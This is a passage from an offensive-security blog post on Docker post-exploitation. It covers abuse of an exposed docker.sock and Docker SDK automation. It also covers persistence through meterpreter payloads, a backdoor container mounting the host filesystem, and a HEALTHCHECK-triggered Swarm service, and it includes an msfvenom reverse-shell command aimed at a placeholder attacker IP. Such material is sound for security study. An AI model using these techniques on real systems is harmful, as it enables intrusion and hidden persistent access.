

#############
<br>
https://morphuslabs.com/attacking-docker-environments-a703fcad2a39
<br>
#############

3. Post-Exploitation: Configuration Flaws
We can exploit configuration flaws to gain direct access to other containers and the Docker daemon. One of the most common configuration flaws found in Docker containers is the use of docker.sock.

Docker.sock is a Unix socket where the Docker daemon is listening to (it can be usually found in ‘/var/run/docker.sock’). We can abuse this feature in order to call functions from the Docker API and run privileged commands (e.g. create new containers). Figure 4 shows an example of using curl to list all running containers (response in JSON format).


Figure 4. Listing containers in Docker with docker.sock
As we can see in figure 5, the use of docker.sock seems to be pretty common!


Figure 5. Large number of Github projects using “docker.sock”
4. Automating attacks with the Docker SDK
We can use Python and the Docker SDK to automate common tasks (e.g. list containers) and perform attacks in other containers. The Docker SDK can be installed with pip:

$ pip install docker
Here are some examples of different things that we can do with the Docker SDK in Python.

Example 01: Creating a new container


Example 02: Listing all containers with Docker.sock enabled


Example 03: Executing one command in all running containers


5. Post-Exploitation: Ideas for Maintaining Access
At this point, we can use different methods to keep persistence in Docker. I will be using python meterpreter payloads for the following examples (you can choose other types of payload if you want).

Msfvenom is used to create the payload (output to backdoor.py).

$ msfvenom -p python/meterpreter_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] -f raw -o backdoor.py
Method 01: Inject meterpreter payload in running containers

If Python is installed in the running containers, the meterpreter payload can be executed directly in each each container.


Method 02: Create a backdoor container

We can create a new container which will do 2 things:

Get a reverse meterpreter shell (to the atacckers machine).
Map the host filesystem inside the container.
The new container is created based on the official Python Docker image.


Method 03: Create a backdoor service

Docker Swarm allows us to get a greater level of persistence by using services. The benefit of creating a backdoor service is because even if our container stops, Docker will automatically restart the container for us!

The Healthcheck instruction is a great feature that can be abused to run our meterpreter payload (which will be executed inside the container every N seconds).

About the Healthcheck instruction [2]:

The HEALTHCHECK instruction tells Docker how to test a container to check that it is still working. This can detect cases such as a web server that is stuck in an infinite loop and unable to handle new connections, even though the server process is still running.


References
[1] https://docs.docker.com/v1.7/articles/networking/

[2] https://docs.docker.com/engine/reference/builder/

55


2


